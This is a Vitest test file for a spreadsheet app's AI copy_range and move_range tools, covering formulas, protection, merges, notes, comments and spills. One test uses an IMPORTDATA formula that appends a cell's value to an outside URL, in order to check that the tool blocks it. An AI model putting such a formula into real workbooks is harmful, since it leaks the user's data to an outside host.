import { describe, expect, it, vi } from 'vitest';
import { Workbook } from '../src/core/workbook.js';
import { runTool, describeCall, callTarget, changesWorkbook } from '../src/core/aitools.js';
import { addComment, getThread } from '../src/core/comments.js';

function setup() {
  const wb = new Workbook();
  const id = wb.activeSheetId;
  const env = { sheetId: () => id, selection: () => ({ sheetId: id, range: { r1: 0, c1: 0, r2: 0, c2: 0 } }), distrust: vi.fn(), select: vi.fn(() => true) };
  const run = (name, args) => runTool(wb, name, args, env);
  run('write_cells', { start_cell: 'A1', values: [['Item', 'Qty', 'Price', 'Total'], ['Apples', 3, 1.2, '=B2*C2'], ['Pears', 5, 0.8, '=B3*C3'], ['Plums', 2, 2.5, '=B4*C4']] });
  wb.clearHistory();
  const json = (res) => JSON.parse(res.content);
  return { wb, id, env, run, json };
}

describe('copy_range', () => {
  it('copies cells with their formulas shifted, as one undo step', () => {
    const { wb, id, run, json } = setup();
    wb.applyStyle(id, { r1: 0, c1: 0, r2: 0, c2: 3 }, { bold: true });
    wb.clearHistory();
    const res = run('copy_range', { source: 'A1:D4', destination: 'F1' });
    expect(res.ok).toBe(true);
    expect(json(res)).toMatchObject({ copied: 'Sheet1!A1:D4', to: 'Sheet1!F1:I4', what: 'all' });
    expect(wb.getCell(id, 1, 8).f).toBe('G2*H2');
    expect(wb.getValue(id, 2, 8)).toBe(4);
    expect(wb.styleAt(id, 0, 5)?.bold).toBe(true);
    expect(wb.undoLabels()).toHaveLength(1);
    wb.undo();
    expect(wb.getCell(id, 0, 5)?.v ?? null).toBe(null);
    expect(changesWorkbook('copy_range')).toBe(true);
  });

  it('copies values only, keeping the destination formatting', () => {
    const { wb, id, run } = setup();
    wb.applyStyle(id, { r1: 1, c1: 6, r2: 3, c2: 6 }, { italic: true });
    run('copy_range', { source: 'D2:D4', destination: 'G2', what: 'values' });
    expect(wb.getCell(id, 1, 6).f ?? null).toBe(null);
    expect(wb.getValue(id, 1, 6)).toBeCloseTo(3.6);
    expect(wb.styleAt(id, 1, 6)?.italic).toBe(true);
  });

  it('copies formats only, leaving the destination values', () => {
    const { wb, id, run } = setup();
    wb.applyStyle(id, { r1: 0, c1: 0, r2: 0, c2: 0 }, { bold: true, bg: '#ff0000' });
    run('write_cells', { start_cell: 'F1', values: [['Keep']] });
    run('copy_range', { source: 'A1', destination: 'F1', what: 'formats' });
    expect(wb.getValue(id, 0, 5)).toBe('Keep');
    expect(wb.styleAt(id, 0, 5)?.bold).toBe(true);
  });

  it('copies formulas only, keeping the destination formatting', () => {
    const { wb, id, run } = setup();
    wb.applyStyle(id, { r1: 1, c1: 3, r2: 1, c2: 3 }, { bold: true });
    run('copy_range', { source: 'D2', destination: 'E2', what: 'formulas' });
    expect(wb.getCell(id, 1, 4).f).toBe('C2*D2');
    expect(wb.styleAt(id, 1, 4)?.bold).toBeFalsy();
  });

  it('transposes rows into columns', () => {
    const { wb, id, run, json } = setup();
    const res = run('copy_range', { source: 'A1:B3', destination: 'F1', transpose: true });
    expect(json(res).to).toBe('Sheet1!F1:H2');
    expect(wb.getValue(id, 0, 6)).toBe('Apples');
    expect(wb.getValue(id, 1, 5)).toBe('Qty');
  });

  it('repeats a copy across a destination that is a multiple of it, and says when it is not', () => {
    const { wb, id, run, json } = setup();
    let res = run('copy_range', { source: 'D2', destination: 'E2:E5' });
    expect(json(res)).toMatchObject({ to: 'Sheet1!E2:E5', copies: 4 });
    expect(wb.getCell(id, 4, 4).f).toBe('C5*D5');
    res = run('copy_range', { source: 'A2:B3', destination: 'H1:J3' });
    expect(json(res).to).toBe('Sheet1!H1:I2');
    expect(json(res).note_on_destination).toMatch(/not a multiple/);
  });

  it('copies to another sheet, naming it in the result', () => {
    const { wb, run, json } = setup();
    const other = wb.addSheet('Summary');
    const res = run('copy_range', { source: 'A1:D4', destination: 'Summary!B2' });
    expect(json(res).to).toBe('Summary!B2:E5');
    expect(wb.getValue(other.id, 2, 4)).toBeCloseTo(3.6);
  });

  it('leaves out hidden rows unless asked to copy them, and says so', () => {
    const { wb, id, run, json } = setup();
    wb.setHidden(id, 'row', [2], true);
    let res = run('copy_range', { source: 'A1:D4', destination: 'F1' });
    expect(json(res).to).toBe('Sheet1!F1:I3');
    expect(json(res).left_out).toMatch(/1 hidden row/);
    expect(wb.getValue(id, 2, 5)).toBe('Plums');
    res = run('copy_range', { source: 'A1:D4', destination: 'K1', include_hidden: true });
    expect(json(res).to).toBe('Sheet1!K1:N4');
    expect(wb.getValue(id, 2, 10)).toBe('Pears');
  });

  it('brings notes along with the cells', () => {
    const { wb, id, run } = setup();
    wb.setNote(id, 1, 0, 'Fresh');
    run('copy_range', { source: 'A2', destination: 'F2' });
    expect(wb.getNote(id, 1, 5)).toBe('Fresh');
  });

  it('refuses a protected destination and changes nothing', () => {
    const { wb, id, run } = setup();
    const other = wb.addSheet('Locked');
    wb.setSheetProtected(other.id, true);
    const before = wb.version;
    const res = run('copy_range', { source: 'A1:D4', destination: 'Locked!A1' });
    expect(res.ok).toBe(false);
    expect(res.content).toMatch(/protected/);
    expect(wb.version).toBe(before);
    expect(wb.getCell(other.id, 0, 0)).toBeFalsy();
    // A protected range on an open sheet refuses too.
    wb.protectRange(id, { r1: 0, c1: 6, r2: 0, c2: 6 });
    const blocked = run('copy_range', { source: 'A1:B1', destination: 'F1' });
    expect(blocked.ok).toBe(false);
    expect(wb.getCell(id, 0, 5)).toBeFalsy();
  });

  it('fills the unlocked cells of a protected sheet with values, not formatting', () => {
    const { wb, id, run } = setup();
    wb.applyStyle(id, { r1: 0, c1: 6, r2: 3, c2: 6 }, { locked: false });
    wb.setSheetProtected(id, true);
    expect(run('copy_range', { source: 'B1:B4', destination: 'G1', what: 'values' }).ok).toBe(true);
    expect(wb.getValue(id, 1, 6)).toBe(3);
    const res = run('copy_range', { source: 'B1:B4', destination: 'H1' });
    expect(res.ok).toBe(false);
    const all = run('copy_range', { source: 'B1:B4', destination: 'G1' });
    expect(all.content).toMatch(/what "values" or "formulas"/);
  });

  it('says how many values fell under a merged cell at the destination', () => {
    const { wb, id, run, json } = setup();
    wb.mergeCells(id, { r1: 0, c1: 6, r2: 1, c2: 6 });
    const res = run('copy_range', { source: 'A1:A2', destination: 'G1' });
    expect(res.ok).toBe(true);
    expect(json(res).not_pasted_under_merged_cells).toMatch(/1 value/);
  });

  it('holds back a copied formula that reaches outside the workbook until the user allows it', () => {
    const { wb, id, env, run, json } = setup();
    wb.setInput(id, 6, 0, '=IMPORTDATA("https://example.com/"&B2)');
    const res = run('copy_range', { source: 'A7', destination: 'B7' });
    expect(env.distrust).toHaveBeenCalled();
    expect(json(res).note).toMatch(/#BLOCKED!/);
    env.distrust.mockClear();
    run('copy_range', { source: 'A7', destination: 'C7', what: 'values' });
    expect(env.distrust).not.toHaveBeenCalled();
  });

  it('asks before replacing data, and links the step to where the copy lands', () => {
    const { wb, env } = setup();
    let d = describeCall(wb, 'copy_range', { source: 'A2:B3', destination: 'F1' }, env);
    expect(d).toMatchObject({ label: 'Copy Sheet1!A2:B3 to Sheet1!F1:G2', destructive: false });
    d = describeCall(wb, 'copy_range', { source: 'A2:B3', destination: 'B2', what: 'values' }, env);
    expect(d.label).toBe('Copy the values of Sheet1!A2:B3 to Sheet1!B2:C3');
    expect(d.destructive).toBe(true);
    expect(d.detail).toMatch(/Replaces 4 cells/);
    expect(describeCall(wb, 'copy_range', { source: 'A2:B3', destination: 'B2', what: 'formats' }, env).destructive).toBe(false);
    expect(callTarget(wb, 'copy_range', { source: 'A2:B3', destination: 'F1' }, env).range).toEqual({ r1: 0, c1: 5, r2: 1, c2: 6 });
  });

  it('takes whole columns as far as their data goes, and a whole-column destination as its first cell', () => {
    const { wb, id, run, json } = setup();
    const res = run('copy_range', { source: 'A:A', destination: 'F:F' });
    expect(json(res)).toMatchObject({ copied: 'Sheet1!A1:A4', to: 'Sheet1!F1:F4' });
    expect(wb.getValue(id, 3, 5)).toBe('Plums');
  });

  it('refuses a destination past the edge of the sheet', () => {
    const { run } = setup();
    const res = run('copy_range', { source: 'A1:D4', destination: 'XFC1' });
    expect(res.ok).toBe(false);
    expect(res.content).toMatch(/edge of the sheet/);
  });
});

describe('move_range', () => {
  it('moves cells, and formulas that refer to them follow, as one undo step', () => {
    const { wb, id, run, json } = setup();
    wb.setInput(id, 9, 0, '=SUM(B2:B4)');
    wb.clearHistory();
    const res = run('move_range', { source: 'A1:D4', destination: 'F1' });
    expect(json(res)).toMatchObject({ moved: 'Sheet1!A1:D4', to: 'Sheet1!F1:I4' });
    expect(wb.getCell(id, 0, 0)?.v ?? null).toBe(null);
    expect(wb.getValue(id, 1, 5)).toBe('Apples');
    expect(wb.getCell(id, 1, 8).f).toBe('G2*H2');
    expect(wb.getCell(id, 9, 0).f).toBe('SUM(G2:G4)');
    expect(wb.undoLabels()).toHaveLength(1);
    wb.undo();
    expect(wb.getValue(id, 1, 0)).toBe('Apples');
    expect(wb.getCell(id, 9, 0).f).toBe('SUM(B2:B4)');
  });

  it('moves cells to another sheet, the formulas that pointed at them naming it', () => {
    const { wb, id, run } = setup();
    const other = wb.addSheet('Archive');
    wb.setInput(id, 9, 0, '=SUM(B2:B4)');
    const res = run('move_range', { source: 'A1:D4', destination: 'Archive!A1' });
    expect(res.ok).toBe(true);
    expect(wb.getValue(other.id, 1, 0)).toBe('Apples');
    expect(wb.getCell(id, 1, 0)?.v ?? null).toBe(null);
    expect(wb.getCell(id, 9, 0).f).toBe('SUM(Archive!B2:B4)');
    expect(wb.getValue(id, 9, 0)).toBe(10);
  });

  it('carries notes with the cells', () => {
    const { wb, id, run } = setup();
    wb.setNote(id, 1, 0, 'Fresh');
    run('move_range', { source: 'A2', destination: 'A8' });
    expect(wb.getNote(id, 7, 0)).toBe('Fresh');
    expect(wb.getNote(id, 1, 0)).toBeFalsy();
  });

  it('refuses part of a merged cell, and says how to move it', () => {
    const { wb, id, run } = setup();
    wb.mergeCells(id, { r1: 5, c1: 0, r2: 5, c2: 1 });
    const res = run('move_range', { source: 'A6', destination: 'A9' });
    expect(res.ok).toBe(false);
    expect(res.content).toMatch(/part of the merged cell A6:B6/);
  });

  it('refuses part of a table taken with cells outside it', () => {
    const { wb, id, run } = setup();
    run('create_table', { range: 'A1:D4', name: 'Fruit' });
    const res = run('move_range', { source: 'C1:E4', destination: 'G1' });
    expect(res.ok).toBe(false);
    expect(res.content).toMatch(/part of the table Fruit/);
    expect(wb.getValue(id, 1, 2)).toBe(1.2);
  });

  it('refuses a protected sheet', () => {
    const { wb, id, run } = setup();
    wb.setSheetProtected(id, true);
    const res = run('move_range', { source: 'A1:D4', destination: 'F1' });
    expect(res.ok).toBe(false);
    expect(res.content).toMatch(/protected/);
  });

  it('says when the cells are already there', () => {
    const { run } = setup();
    const res = run('move_range', { source: 'A1:B2', destination: 'A1' });
    expect(res.ok).toBe(false);
    expect(res.content).toMatch(/already there/);
  });

  it('moves whole columns', () => {
    const { wb, id, run, json } = setup();
    const res = run('move_range', { source: 'B:B', destination: 'H5' });
    expect(json(res).to).toBe('Sheet1!H:H');
    expect(wb.getValue(id, 1, 7)).toBe(3);
    expect(wb.getCell(id, 1, 3).f).toBe('H2*C2');
  });

  it('asks before replacing data, leaving out its own cells where the places overlap', () => {
    const { wb, env } = setup();
    let d = describeCall(wb, 'move_range', { source: 'A1:B2', destination: 'A2' }, env);
    expect(d.label).toBe('Move Sheet1!A1:B2 to Sheet1!A2:B3');
    expect(d.detail).toMatch(/Replaces 2 cells/);
    d = describeCall(wb, 'move_range', { source: 'A1:B2', destination: 'K1' }, env);
    expect(d.destructive).toBe(false);
    expect(callTarget(wb, 'move_range', { source: 'A1:B2', destination: 'K1' }, env).range).toEqual({ r1: 0, c1: 10, r2: 1, c2: 11 });
  });

  it('warns of a spill it blocks, but not of one moving with the cells, and says when it blocked one', () => {
    const { wb, id, env, run, json } = setup();
    wb.setInput(id, 0, 9, '=SEQUENCE(3)');
    // The array moves along with its rows: nothing is blocked, and nothing is asked.
    expect(describeCall(wb, 'move_range', { source: 'J1:J3', destination: 'J2' }, env)).toMatchObject({ destructive: false });
    expect(describeCall(wb, 'move_range', { source: '1:4', destination: 'A2' }, env).detail ?? '').not.toMatch(/SPILL/);
    // A value moved into its results blocks them.
    wb.setInput(id, 9, 0, 9);
    expect(describeCall(wb, 'move_range', { source: 'A10', destination: 'J2' }, env).detail).toMatch(/#SPILL!/);
    expect(json(run('move_range', { source: 'A10', destination: 'J2' })).spills_blocked[0]).toMatch(/^Sheet1!J1 now shows #SPILL!/);
  });

  it('asks before a move or a copy takes comment threads off where it lands, and counts notes only when a copy replaces them', () => {
    const { wb, id, env, run } = setup();
    addComment(wb, id, 0, 10, 'Check this', 'Ann');
    wb.setNote(id, 1, 10, 'Kept');
    // A move takes the destination's thread and note, though the cells hold no data.
    expect(describeCall(wb, 'move_range', { source: 'A1:A2', destination: 'K1' }, env).detail).toBe('Replaces 1 note and 1 comment thread there.');
    // A copy bringing neither leaves both; one bringing a thread replaces the thread.
    expect(describeCall(wb, 'copy_range', { source: 'A1:A2', destination: 'K1' }, env)).toMatchObject({ destructive: false, detail: null });
    addComment(wb, id, 0, 0, 'Source', 'Ann');
    expect(describeCall(wb, 'copy_range', { source: 'A1:A2', destination: 'K1' }, env).detail).toBe('Replaces 1 comment thread there.');
    run('copy_range', { source: 'A1:A2', destination: 'K1' });
    expect(getThread(wb, id, 0, 10).items[0].text).toBe('Source');
    expect(wb.getNote(id, 1, 10)).toBe('Kept');
  });
});
